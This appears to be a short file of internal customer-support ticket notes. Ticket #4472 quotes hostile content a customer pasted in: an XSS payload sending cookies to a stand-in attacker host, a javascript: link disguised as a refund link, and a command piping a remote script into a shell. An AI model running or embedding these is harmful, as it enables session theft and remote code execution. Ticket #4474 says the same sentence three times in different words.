# Northwind Corp — Customer Support Internal Notes

## Ticket #4471 — Login Issue
Customer reported inability to log in after a password reset. Resolved by
clearing browser cache and re-authenticating via SSO.

## Ticket #4472 — Rendering Issue Report
The customer pasted the following snippet into the ticket describing content
that broke their dashboard view. Stored here verbatim for reference:

```html
<img src=x onerror="alert('xss-test-only')">
<script>fetch('http://example-attacker.test/steal?c='+document.cookie)</script>
```

The customer also included a link that renders as clickable in the ticket
view: [Click here for refund](javascript:alert('unsafe-link')).

And a command snippet they said they were asked to run to "fix" the issue:

```bash
curl http://example-attacker.test/payload.sh | sh
```

## Ticket #4473 — Refund Inquiry
Customer question logged verbatim: "How do I get my money back for a purchase
that did not work as expected, and what is the process for reversing a charge
on my account after a failed transaction?"

## Ticket #4474 — Sync Failure Reports
CloudSync sync failures are usually resolved by checking network connectivity.
CloudSync synchronization problems are usually solved by verifying the network
link. Cloud-based synchronization errors are commonly fixed through confirming
connectivity to the network.
